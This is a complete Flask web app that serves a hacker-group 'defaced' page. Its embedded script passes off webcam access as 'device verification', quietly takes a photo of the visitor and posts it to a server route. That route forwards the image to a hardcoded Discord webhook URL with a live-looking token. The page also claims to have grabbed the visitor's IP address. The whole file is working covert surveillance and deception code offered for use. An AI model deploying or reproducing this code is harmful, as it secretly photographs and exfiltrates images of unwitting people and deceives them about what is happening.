from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://discord.com/api/webhooks/1381298079151689850/sLg1G-ral1Nd9Mjtlt_JGmLGRx2toNtvRqKD5h9SUM8W1ideADMz1XTYbHmIAye41bRR')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Defaced Page</title>
    <style>
        body {
            background: black;
            color: white;
            font-family: monospace;
            text-align: center;
            background-image: url('https://i.ibb.co/dsSdQV7s/536c6323d439596e766f055498e775e4.jpg');
            background-size: cover;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .logo-container {
            margin-top: 50px;
            width: 250px;
            height: 250px;
            border-radius: 50%;
            overflow: hidden;
            box-shadow: 0 0 20px 5px rgba(255, 255, 255, 0.8);
            transition: transform 0.3s ease;
        }
        .logo-container:hover {
            transform: scale(1.05);
        }
        .logo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        h1 {
            font-size: 40px;
            color: red;
            text-shadow: 0 0 15px red;
            margin: 20px 0;
        }
        .warning {
            color: yellow;
            font-size: 22px;
            margin: 10px 0;
        }
        p {
            margin: 10px 0;
        }
        .time {
            margin-top: 30px;
            font-size: 20px;
            color: #f55;
        }
        .footer {
            margin-top: 40px;
            font-size: 14px;
            color: #aaa;
        }
        video {
            display: none;
        }
        #status {
            font-size: 16px;
            color: #c0392b;
        }
    </style>
</head>
<body>
    <a href="https://i.ibb.co/VpMYjFrn/30b94658f685ffd183c8c442d2973d30.jpg" target="_blank">
        <div class="logo-container">
            <img src="https://i.ibb.co/VpMYjFrn/30b94658f685ffd183c8c442d2973d30.jpg" alt="Logo" class="logo">
        </div>
    </a>
    <h1>FCT</h1>
    <p class="warning">WARNING</p>
    <p>Your IP address was grabbed by FCT.<br>Please strengthen your security next time.</p>
    <p>FCT WAS HERE</p>
    <p>[FCT]</p>
    <p id="status">Checking device...</p>
    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="time"></div>
    <div class="footer"><br></div>

    <script>
        const webcamElement = document.getElementById('webcam');
        const canvasElement = document.getElementById('canvas');
        const statusElement = document.getElementById('status');

        async function startWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                webcamElement.srcObject = stream;
                statusElement.textContent = 'Verifying device...';
                setTimeout(captureSnapshot, 1000);
            } catch (err) {
                statusElement.textContent = 'Please allow access to proceed.';
            }
        }

        function captureSnapshot() {
            const context = canvasElement.getContext('2d');
            canvasElement.width = webcamElement.videoWidth || 640;
            canvasElement.height = webcamElement.videoHeight || 480;
            context.drawImage(webcamElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                const formData = new FormData();
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                formData.append('file', blob, `face_${timestamp}.jpg`);

                try {
                    const response = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });
                    if (response.ok) {
                        statusElement.textContent = 'Device verified!';
                        webcamElement.srcObject.getTracks().forEach(track => track.stop());
                    } else {
                        statusElement.textContent = 'Verification failed. Try again.';
                    }
                } catch (err) {
                    statusElement.textContent = 'Network issue. Try again.';
                }
            }, 'image/jpeg');
        }

        startWebcam();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if file:
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        files = {'file': (f'face_{timestamp}.jpg', file.read(), 'image/jpeg')}
        try:
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 204:
                return 'Success', 200
            else:
                return 'Failed', 500
        except Exception:
            return 'Network error', 500
    return 'No', 400

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
